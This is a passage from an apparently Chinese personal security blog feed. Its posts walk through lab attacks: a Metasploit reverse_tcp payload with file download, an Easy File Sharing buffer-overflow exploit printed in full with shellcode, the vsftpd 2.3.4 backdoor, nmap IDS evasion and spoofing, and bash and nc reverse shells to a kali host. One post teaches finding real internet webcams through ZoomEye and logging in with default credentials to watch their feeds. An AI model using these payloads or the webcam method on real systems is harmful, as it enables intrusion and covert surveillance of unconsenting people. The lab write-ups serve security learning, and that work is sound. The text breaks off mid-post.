&#x2F;&#x2F; 失败时返回 false , 成功返回配置数组</p><h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><p>print_r(glob(“*”)); &#x2F;&#x2F; 列当前目录</p><p>print_r(glob(“&#x2F;*”)); &#x2F;&#x2F; 列根目录 print_r(scandir(“.”));</p><p>print_r(scandir(“&#x2F;“));</p><p>$d&#x3D;opendir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d))){echo”$f\n”;}</p><p>$d&#x3D;dir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read())){echo$f.”\n”;}</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit的简单应用</title>
      <link href="/2021/11/06/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/"/>
      <url>/2021/11/06/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit的简单应用"><a href="#Metasploit的简单应用" class="headerlink" title="Metasploit的简单应用"></a>Metasploit的简单应用</h1><p>1、生成主控端、被控端。<br>2、获得靶机(Windows)控制权。<br>3、下载靶机上任意一个文件。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>靶机： 关闭了windows安全中心的win10，ip: 192.168.118.132</p><p>攻击机：kali ip:192.168.118.128</p><h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><p>生成被控端</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.128 LPORT=5000 -f exe &gt; /root/payload.exe#LHOST=kali的ip#LPORT=端口</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106175332973.png" alt="image-20211106175332973"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106175426563.png" alt="image-20211106175426563"></p><p>将生成的payload.exe丢进靶机里面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106180904411.png" alt="image-20211106180904411"></p><p>回到kali</p><p>运行msfconsole</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106181253626.png" alt="image-20211106181253626"></p><p>执行以下命令</p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106185237839.png" alt="image-20211106185237839"></p><p>执行 show options查看配置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106185450806.png" alt="image-20211106185450806"></p><p>发现LHOST和LPORT还没设置</p><p>执行</p><pre><code>set lhost 192.168.118.128set lport 5000</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106190234370.png" alt="image-20211106190234370"></p><p>LHOST和LPORT已经重新设置</p><p>然后执行</p><pre><code>exploit</code></pre><p>等待对方上线</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106190753464.png" alt="image-20211106190753464"></p><p>双击靶机的payload.exe就可以看到kali中出现了一个session，也就是会话，这表示从现在起，我们可以通过被控制端程序来控制目标计算机了。同时，我们可以看到上图中出现meterpreter，这就是一个被控程序，meterpreter是运行在内存中的，通过注入dll文件实现，在目标计算机的硬盘上不会留下文件痕迹，所以在被入侵时很难找到。输入ls就可以查看payload.exe文件所在的当前目录有哪些文件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191133783.png" alt="image-20211106191133783"></p><p>我在靶机桌面上放了个flag.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106192310207.png" alt="image-20211106192310207"></p><p>回到kali执行ls查看文件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191512514.png" alt="image-20211106191512514"></p><p>把它下载下来</p><pre><code>download flag.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191953885.png" alt="image-20211106191953885"></p><p>得到flag</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106192133806.png" alt="image-20211106192133806"></p><p>搞定收工</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easy file sharing server漏洞复现</title>
      <link href="/2021/11/03/easy-file-sharing-server%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/11/03/easy-file-sharing-server%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="easy-file-sharing-server漏洞复现"><a href="#easy-file-sharing-server漏洞复现" class="headerlink" title="easy file sharing server漏洞复现"></a>easy file sharing server漏洞复现</h1><h2 id="一、漏洞详情"><a href="#一、漏洞详情" class="headerlink" title="一、漏洞详情"></a>一、漏洞详情</h2><p>Easy File Sharing FTP Server是一款FTP服务程序。 Easy File Sharing FTP Server处理PASS命令存在问题，远程攻击者可以利用漏洞进行缓冲区溢出攻击，可能以进程权限执行任意指令。 提交超长字符串作为PASS命令参数，可导致触发缓冲区溢出，精心构建提交数据可能以进程权限执行任意指令。</p><h2 id="二、工具"><a href="#二、工具" class="headerlink" title="二、工具"></a>二、工具</h2><p>靶机： 192.168.118.132、win10（可用其他win系统，把windows安全中心关闭）、安装easy file sharing server</p><p>攻击机：192.168.118.128、kali</p><h2 id="三、开始复现"><a href="#三、开始复现" class="headerlink" title="三、开始复现"></a>三、开始复现</h2><p>靶机打开easy file sharing server，把端口改为8000，然后点击restart</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211103203726819.png"></p><p>在kali用nmap扫描</p><pre><code>nmap -sV 192.168.118.0/24  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211103204514315.png" alt="image-20211103204514315"></p><p>可以发现主机192.168.118.132（靶机）已经在8000端口打开了Easy File Sharing 服务</p><p>在kali使用searchsploit工具查找相应的渗透模块</p><p><a href="https://blog.csdn.net/qq_38243607/article/details/107140817">传送门</a></p><pre><code>searchsploit easy file sharing</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211103211503587.png" alt="image-20211103211503587"></p><p>图片中path的，就是示例脚本的路径，完整路径是：&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;+path中的脚本路径</p><p>这里使用39009.py</p><pre><code>python /usr/share/exploitdb/exploits/windows/remote/39009.py 192.168.118.132 8000</code></pre><p>复现成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211103213100870.png"></p><p>脚本代码</p><pre><code class="python"># Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow# Date: 12/2/2015# Exploit Author: ArminCyber# Contact: Armin.Exploit@gmail.com# Version: 7.2# Tested on: XP SP3 EN# category: Remote Exploit# Usage: ./exploit.py ip portimport socketimport syshost = str(sys.argv[1])port = int(sys.argv[2])a = socket.socket()print &quot;Connecting to: &quot; + host + &quot;:&quot; + str(port)a.connect((host,port))entire=4500# Junkbuff = &quot;A&quot;*4061# Next SEHbuff+= &quot;\xeb\x0A\x90\x90&quot;# pop pop retbuff+= &quot;\x98\x97\x01\x10&quot;buff+= &quot;\x90&quot;*19# calc.exe# Bad Characters: \x20 \x2f \x5cshellcode = (&quot;\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9&quot;&quot;\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56&quot;&quot;\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9&quot;&quot;\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97&quot;&quot;\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64&quot;&quot;\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8&quot;&quot;\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a&quot;&quot;\x1c\x39\xbd&quot;)buff+= shellcodebuff+= &quot;\x90&quot;*7buff+= &quot;A&quot;*(4500-4061-4-4-20-len(shellcode)-20)# HEADa.send(&quot;HEAD &quot; + buff + &quot; HTTP/1.0\r\n\r\n&quot;)a.close()print &quot;Done...&quot;</code></pre><h2 id="另一种“姿势”"><a href="#另一种“姿势”" class="headerlink" title="另一种“姿势”"></a>另一种“姿势”</h2><p>利用Metasploit生成主控端和被动端</p><p>在kali输入</p><pre><code>msfconsole</code></pre><p>开启msf控制台</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104122617692.png" alt="image-20211104122617692"></p><p>寻找EasyFileSharing漏洞利用模块</p><pre><code>search EasyFileSharing</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104122911066.png" alt="image-20211104122911066"></p><p>然后</p><pre><code>use exploit/windows/http/easyfilesharing_seh</code></pre><p>提示No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</p><pre><code>show options//查看配置</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104123311810.png" alt="image-20211104123311810"></p><pre><code>set rhost 192.168.118.132</code></pre><p>输入 </p><pre><code>exploit</code></pre><p>模块执行成功，然后你就可以执行任意你想要执行的命令</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131046111.png" alt="image-20211104131046111"></p><p>在靶机写个字符串保存在flag.txt里，放在C:\EFS Software\Easy File Sharing Web Server下，用于后续辨别</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131150479.png" alt="image-20211104131150479"></p><p>执行命令ls，可以找到刚刚在靶机写的flag.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131253395.png" alt="image-20211104131253395"></p><p>把它下载下来</p><pre><code>download flag.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131438019.png" alt="image-20211104131438019"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131554985.png" alt="image-20211104131554985"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现(vsftpd 2.3.4)</title>
      <link href="/2021/11/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-vsftpd-2-3-4/"/>
      <url>/2021/11/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-vsftpd-2-3-4/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞复现-vsftpd-2-3-4"><a href="#漏洞复现-vsftpd-2-3-4" class="headerlink" title="漏洞复现(vsftpd 2.3.4)"></a>漏洞复现(vsftpd 2.3.4)</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>攻击机：kali: 192.168.118.128</p><p>靶机：Metasplotable2-Linux: 192.168.118.131</p><h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><p>打开kali终端，执行以下命令</p><pre><code>nmap 192.168.118.0/24</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-01%20165841.png" alt="屏幕截图 2021-11-01 165841"></p><p>发现靶机(192.168.118.131)打开着21端口 </p><pre><code>nmap -sV 192.168.118.131</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211101170431983.png" alt="image-20211101170431983"></p><p>这里可以看到靶机的ftp服务的版本信息是vsftpd 2.3.4，漏洞就在这里</p><pre><code>ftp 192.168.118.131 21</code></pre><pre><code>用户名 root:)//&#39;:)&#39;是触发条件密码： sssss //密码可乱来</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211101172804027.png" alt="image-20211101172804027"></p><p>执行以上命令后发现靶机打开了6200端口，这就是个后门</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211101172714302.png" alt="image-20211101172714302"></p><p>然后直接连接这个端口</p><pre><code>nc 192.168.118.131 6200</code></pre><p>成功连接,后门建立了shell，可以开始执行命令</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211101173201531.png" alt="image-20211101173201531"></p><p>复现结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zoomeye抓取摄像头</title>
      <link href="/2021/10/25/zoomeye%E6%8A%93%E5%8F%96%E6%91%84%E5%83%8F%E5%A4%B4/"/>
      <url>/2021/10/25/zoomeye%E6%8A%93%E5%8F%96%E6%91%84%E5%83%8F%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="zoomeye抓取摄像头"><a href="#zoomeye抓取摄像头" class="headerlink" title="zoomeye抓取摄像头"></a>zoomeye抓取摄像头</h1><h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2><p>打开zoomeye，在搜索框搜索搜索关键词“JAWS”</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20212442.png"></p><h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><p>寻找摄像头，点击图中所画的圈内的黑点进入</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/Inked%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20203524_LI.jpg"></p><p>尝试弱口令（默认口令）</p><p>用户名：admin</p><p>密码：空</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20213227.png"></p><p>接下来就是一个个尝试了</p><h2 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h2><p>登录成功后，若出现以下情况，就点击“here”下载安装flash</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20203420.png"></p><p>下载并安装成功后，将url复制到flash的搜索框内，点击搜索</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/Inked%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20203934_LI.jpg"></p><p>然后就能看到摄像头的画面了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/Inked%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20204036_LI.jpg"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NMAP的基本使用</title>
      <link href="/2021/10/18/nmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/10/18/nmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="NMAP的基本使用"><a href="#NMAP的基本使用" class="headerlink" title="NMAP的基本使用"></a>NMAP的基本使用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​nmap是一个网络探测和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取那台主机正在运行以及提供什么服务等信息。nmap支持很多扫描技术</p><h2 id="初次使用"><a href="#初次使用" class="headerlink" title="初次使用"></a>初次使用</h2><p>（这里使用kali自带的作为演示）</p><p>首先我们要知道这工具该怎么用，</p><p>在kali打开终端，输入如下命令，可以知道有哪些命令</p><pre><code>nmap -h</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20171852.png"></p><h2 id="最基本的命令"><a href="#最基本的命令" class="headerlink" title="最基本的命令"></a>最基本的命令</h2><pre><code>nmap ip（域名）//可以扫描出其对外开放的服务</code></pre><p>如</p><pre><code>nmap www.baidu.comnmap xxx.xxx.xxx.xxx</code></pre><h2 id="端口扫描常用参数"><a href="#端口扫描常用参数" class="headerlink" title="端口扫描常用参数"></a>端口扫描常用参数</h2><ol><li>-sT<br> TCP connect()扫描：这是最基本的TCP扫描方式。connect()是一种系统调用，由操作系统提供，用来打开一个连接。如果目标端口有程序监听，connect()就会成功返回，否则这个端口是不可达的。</li><li>-sS<br>　TCP同步扫描(TCP  SYN)：因为不必全部打开一个TCP连接，所以这项技术通常称为半开扫描(half-open)。你可以发出一个TCP同步包(SYN)，然后等待回应。如果对方返回SYN|ACK(响应)包就表示目标端口正在监听；如果返回RST数据包，就表示目标端口没有监听程序；如果收到一个SYN|ACK包，源主机就会马上发出一个RST(复位)数据包断开和目标主机的连接，这实际上有我们的操作系统内核自动完成的。这项技术最大的好处是，很少有系统能够把这记入系统日志。不过，你需要root权限来定制SYN数据包。</li><li>-sP<br> ping扫描：有时你只是想知道此时网络上哪些主机正在运行。通过向你指定的网络内的每个IP地址发送ICMP echo请求数据包，nmap就可以完成这项任务。如果主机正在运行就会作出响应。</li><li>-sU<br> UDP扫描：如果你想知道在某台主机上提供哪些UDP(用户数据报协议,RFC768)服务，可以使用这种扫描方法。nmap首先向目标主机的每个端口发出一个0字节的UDP包，如果我们收到端口不可达的ICMP消息，端口就是关闭的，否则我们就假设它是打开的。</li><li>-R<br>  RPC扫描。这种方法和nmap的其它不同的端口扫描方法结合使用。选择所有处于打开状态的端口向它们发出SunRPC程序的NULL命令，以确定它们是否是RPC端口，如果是，就确定是哪种软件及其版本号。因此你能够获得防火墙的一些信息。诱饵扫描现在还不能和RPC扫描结合使用。</li><li>-v<br> 冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。使用这个选项，你可以得到事半功倍的效果。使用-d选项可以得到更加详细的信息。</li><li>-O<br>  这个选项激活对TCP&#x2F;IP指纹特征(fingerprinting)的扫描，获得远程主机的标志。换句话说，nmap使用一些技术检测目标主机操作系统网络协议栈的特征。nmap使用这些信息建立远程主机的指纹特征，把它和已知的操作系统指纹特征数据库做比较，就可以知道目标主机操作系统的类型。</li><li>-p 指定扫描端口  nmap -p 80,445 192.168.21.1    nmap -p 1-1000 192.168.21.1</li><li>-F 快速扫描常用端口  nmap -F 192.168.21.1</li><li>-r 使用该选项不会对端口进行随机的顺序扫描</li><li>–top-ports  扫描开发概率最高的1000个TCP端口  nmap –top-ports 1000 192.168.21.1  nmap –top-ports 100 192.168.21.1</li></ol><h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h2><p>1.Open，端口开启，有程序监听此端口</p><p>2.Closed，端口关闭，数据能到达主机，但是没有程序监听此端口。<br>3.Filtered，数据未能到达主机。<br>4.Unfiltered，数据能到达主机，但是Nmap无法判断端口开启还是关闭。<br>5.Open|filtered，端口没有返回值，主要出现在UDP，IP，FIN，NULL和Xmas扫描<br>6.Closed|filtered，只出现在IP ID idle 扫描。</p><h4 id="时序选项"><a href="#时序选项" class="headerlink" title="时序选项:"></a>时序选项:</h4><p>在Nmap中使用-T (0-5)可以启用时序选项，对于时序选项这里有0~5不同的选项。</p><p>IDS:入侵检测系统</p><p>-T0 (偏执的):非常慢的扫描，用于IDS逃避。<br>-T1 (鬼祟的):缓慢的扫描，用于IDS逃避。<br>-T2 (文雅的):降低速度以降低对带宽的消耗，此选项- -般不常用。<br>-T3 (普通的):默认，根据目标的反应自动调整时间。<br>-T4 (野蛮的):快速扫描，常用扫描方式，需要在很好的网络环境下进行扫描，请求可能会淹没目标。<br>-T5 (疯狂的):极速扫描，这种扫描方式以牺牲准确度来提升扫描速度。</p><p>(现在一般用-T4)</p><pre><code>nmap -T4 192.168.21.1</code></pre><h2 id="主机发现常用命令"><a href="#主机发现常用命令" class="headerlink" title="主机发现常用命令"></a>主机发现常用命令</h2><p>nmap -A baidu.com:全面扫描</p><p>nmap 127.0.0.1-200:扫描一个C段</p><p>nmap baidu.com :进行一个快速的扫描</p><p>Ping扫描:</p><pre><code>只进行ping,然后显示出在线的主机主机发现:nmap -sP 192.168.126.131/24</code></pre><p>无Ping扫描:</p><pre><code>常用于防火墙禁止ping的情况下nmap -P0 192.168.121.32可以手动设置扫描的协议：    TCP:对应协议编号为6。    ICMP:对应协议编号为1    IGMP:对应协议编号为2    UDP:对应协议编号为17用TCP,UDP,IGMP协议向目标主机发包判断是否存活;    nmap -p06,17,2 192.168.121.1/24   (默认用的为1,2,4)</code></pre><p>TCP SYN扫描</p><pre><code>nmap -PS -v 192.168.21.1通常情况下Nmap 默认ping扫描是使用TCP ACK和ICMP Echo请求对目标进行扫描.目标主机的防火墙阻止这些请求时,可以用TCP SYN Ping扫描进行对目标主机存活的判断指定端口范围进行的扫描nmap -PS80,100-200 -v 192.168.21.1TCP ACK Ping扫描    使用-PA选项可以进行TCP ACK Ping扫描，它与TCP SYN Ping扫描是非常类似的，唯一的区别是设置TCP的标志位是ACK而不是SYN,使用这种方式扫描可以探测阻止:SYN包或ICMP Echo请求的主机。很多防火墙会封锁SYN报文,所以Nmap提供了TCP SYN Ping扫描与TCP ACK Ping扫描两种探测方式，这两种方式可以极大地提高通过防火墙的概率，我们还可以同时使用-PS与-PA来既发送SYN又发送ACK。在使用TCP ACK Ping扫描时，Nmap 会发送一一个ACK标志的TCP包给目标主机，如果目标主机不是存活状态则不响应该请求，如果目标主机在线则会返回一个RST包。    nmap -PA 192.168.21.1    nmap -PA -PS -v 192.168.21.1两种一起用UDP Ping 扫描    nmap -PU 192.168.21.1ARP Ping 扫描    通常在扫描局域网时使用,内网使用ARP Ping扫描方式是最有效的    nmap 默认情况下扫描局域网内的主机会使用ARP扫描,即使指定了-PS等    nmap -PR 192.168.21.1-200列表扫描 -sL 不知道有啥用禁止反向域名解析 -n    该选项很少使用，如果是对–台有域名绑定的服务器通常不会使用该选项;    如果是单纯扫描一-段IP， 使用该选项可以大幅度减少目标主机的相应时间，从而更快地得到结果。反向域名解析    -R选项意为反向解析城名，使用该选项时Nmap永远对目标IP地址作反向域名解析。    该选项多用于绑定域名的服务器主机上,该选项的使用便于我们了解目标的详细信息。例如，在扫描一个C段的时候，我们更加清楚在哪- - 段IP上存在哪些网站。扫描IPV6    nmap -6 fe80::1c98:68e:303d:496aIPv6将会逐渐替换IPv4,但在一段相当长的时间内，IPv4 还会大量地存在。后面章节演示的IP则都是IPv4地址，如果需要扫描IPv6地址，则需要在每个语句的IPv6目标地址前面加上-6选项。–traceroute 路由跟踪    nmap --traceroute -v baidu.com</code></pre><h2 id="防火墙-x2F-IDS-入侵检测-逃逸"><a href="#防火墙-x2F-IDS-入侵检测-逃逸" class="headerlink" title="防火墙&#x2F;IDS(入侵检测)逃逸"></a>防火墙&#x2F;IDS(入侵检测)逃逸</h2><p>报文分段</p><pre><code>nmap -sV -F 192.168.1.100</code></pre><p>IP欺骗 -D</p><pre><code>RND 随机生成:nmap -D RND:11 192.168.21.1指定IP:nmap -D 192.168.1.1,192.168.1.2,192.168.1.3 192.168.21.1</code></pre><p>源地址欺骗-sI</p><pre><code>nmap -sI www. 0day.co:80 192.168.126.131</code></pre><p>源端口欺骗</p><pre><code>nmap --source-port 53 182.168.21.1</code></pre><p>MAC地址欺骗</p><pre><code>spoof-mac 0会随机生成一个nmap -sT -PN --spoof-mac 0 192.168.126.131</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux反弹shell</title>
      <link href="/2021/10/16/linux%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2021/10/16/linux%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="linux反弹shell"><a href="#linux反弹shell" class="headerlink" title="linux反弹shell"></a>linux反弹shell</h1><p>客户机：ubuntu</p><p>ip: 192.168.118.130</p><p>攻击机：kali  </p><p>ip:192.168.118.128</p><h2 id="1-bash反弹"><a href="#1-bash反弹" class="headerlink" title="1.bash反弹"></a>1.bash反弹</h2><p>攻击机执行命令：</p><pre><code>nc -lvp 8888</code></pre><p><img src="https://i.loli.net/2021/10/09/STNBcU6bdr9XwW5.png"></p><p>客户机执行命令：</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.118.128/8888 0&gt;&amp;1</code></pre><p><img src="https://i.loli.net/2021/10/09/Sd84UwZfyoCgt7L.png"></p><p>然后攻击机这边成功拿到shell</p><p><img src="https://i.loli.net/2021/10/09/EegIW67x9sPRu8A.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre><code>bash -i &gt;&amp; /dev/tcp/远程ip/port 0&gt;&amp;1</code></pre><p>bash是&#x2F;bin&#x2F;目录下的二进制程序</p><p>&#x2F;dev&#x2F;tcp是Linux中的一个特殊设备，打开这个文件相当于发出了一个socket调用，建立一个socket连接。</p><p>0&gt;&amp;:  当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</p><p>0&gt;&amp;1: 在命令后面加上0&gt;&amp;1,表示将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;远程ip&#x2F;port这个文件，也就是远程，那么标准输入也重定向到了远程</p><pre><code>nc -lvp port</code></pre><p>nc 全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流。</p><p>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。<br>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。<br>-h 在线帮助。<br>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。<br>-l 使用监听模式，管控传入的资料。<br>-n 直接使用IP地址，而不通过域名服务器。<br>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。<br>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。<br>-r 乱数指定本地与远端主机的通信端口。<br>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。<br>-u 使用UDP传输协议。<br>-v 显示指令执行过程。详细信息<br>-w&lt;超时秒数&gt; 设置等待连线的时间。<br>-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</p><p>其他版本</p><p>攻击机：</p><pre><code>nc -lvp 3434</code></pre><pre><code>客户机：exec 5&lt;&gt;/dev/tcp/192.168.118.128/3434cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre><p><img src="https://raw.githubusercontent.com/todis21/todis21.github.io/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-13%20222957.png"></p><p><img src="https://raw.githubusercontent.com/todis21/todis21.github.io/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-13%20223016.png"></p><h2 id="2-nc交互式反弹"><a href="#2-nc交互式反弹" class="headerlink" title="2.nc交互式反弹"></a>2.nc交互式反弹</h2><p>攻击机</p><pre><code>nc -lvp 8888nc -lvvp 8888</code></pre><p><img src="https://i.loli.net/2021/10/09/nM47yYBSRo2UmNX.png"></p><p>客户机;</p><pre><code> /bin/sh | nc 192.168.118.128 8888</code></pre><p>连接后，在攻击机输入的字符回车后会在客户机呈现</p><p><img src="https://i.loli.net/2021/10/09/BzpsmjTncC6oQre.png"></p><p><img src="https://i.loli.net/2021/10/09/xIK14h8bEkUDs9i.png"></p><p><a href="https://xz.aliyun.com/t/2548">参考文章1</a></p><p><a href="https://xz.aliyun.com/t/2549">参考文章2</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark分析ping的数据包</title>
      <link href="/2021/10/11/Wireshark%E5%88%86%E6%9E%90ping%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
      <url>/2021/10/11/Wireshark%E5%88%86%E6%9E%90ping%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark分析ping的数据包"><a href="#Wireshark分析ping的数据包" class="headerlink" title="Wireshark分析ping的数据包"></a>Wireshark分析ping的数据包</h1><h2 id="1-抓取ping数据包"><a href="#1-抓取ping数据包" class="headerlink" title="1.抓取ping数据包"></a>1.抓取ping数据包</h2><p>打开Wireshark  开启抓包，打开cmd输入ping github.com 回车</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20133742.png"></p><p>在Wireshark的中条件过滤栏输入“icmp”</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20133907.png"></p><p>可以看到8个报文，其中有4个请求报文和4个应答报文</p><h2 id="2-分析其中一个报文（request）"><a href="#2-分析其中一个报文（request）" class="headerlink" title="2.分析其中一个报文（request）"></a>2.分析其中一个报文（request）</h2><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>可以看到ping request数据链路层报文一共有74个字节，帧序号为258，使用的协议为icmp协议</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20134012.png"></p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>这里有发送数据帧的源节点MAC地址和接收数据帧的目标节点MAC地址</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20134135.png"></p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>这里包含着发送数据帧的源节点IP地址和接收数据帧的目标节点IP地址</p><p><img 